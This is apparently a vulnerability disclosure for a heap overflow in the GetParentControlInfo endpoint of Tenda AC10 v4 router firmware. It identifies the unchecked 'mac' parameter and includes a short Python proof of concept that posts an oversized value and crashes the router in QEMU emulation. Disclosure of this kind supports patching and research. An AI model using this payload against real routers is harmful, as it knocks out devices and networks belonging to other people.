# The router Tenda AC10 v4 V16.03.10.13 of Shenzhen Jixiang Tenda Technology Co., Ltd. has a heap overflow vulnerability.

Firmware download link: [AC10 v4.0 Firmware Update](https://www.tenda.com.cn/material/show/103506)

Vulnerability URL: http://192.168.100.135/goform/GetParentControlInfo

The vulnerability occurs in the `GetParentControlInfo` function.

![Alt text](https://github.com/xubeining/Cve_report/blob/main/heap1.png)
![Alt text](https://github.com/xubeining/Cve_report/blob/main/heap2.png)

The program retrieves the user input parameter "mac" but does not check its size. When the input parameter is excessively large, it causes a heap overflow, leading to program crashes or exploitation.  
The vulnerability is located at line 49 in the `GetParentControlInfo` function, which is mapped to the route `GetParentControlInfo`.

![Alt text](https://github.com/xubeining/Cve_report/blob/main/heap3.png)

Further cross-referencing leads to the function `sub_43B3D8`, with attention focused on lines 35 and 38.

![Alt text](https://github.com/xubeining/Cve_report/blob/main/heap4.png)

The vulnerability occurs on the page path `/goform/GetParentControlInfo`.

payload:(python)
```python
import base64
import requests

url = "http://192.168.100.157:80/goform/GetParentControlInfo"

payload = {
   'mac': b'a'*(0x100000)
}

res = requests.post(url=url, data=payload)
print("Status Code:", res.status_code)
print("Response:", res.text)
```
### Reproduction Steps

# Launch QEMU Emulation
Open the QEMU emulator to simulate the environment.

![Alt text](https://github.com/xubeining/Cve_report/blob/main/heap5.png)

![Alt text](https://github.com/xubeining/Cve_report/blob/main/heap6.png)

Run the script.
![Alt text](https://github.com/xubeining/Cve_report/blob/main/heap7.png)

![Alt text](https://github.com/xubeining/Cve_report/blob/main/heap8.png)

![Alt text](https://github.com/xubeining/Cve_report/blob/main/heap9.png)

The router crashes, and the web page becomes inaccessible.
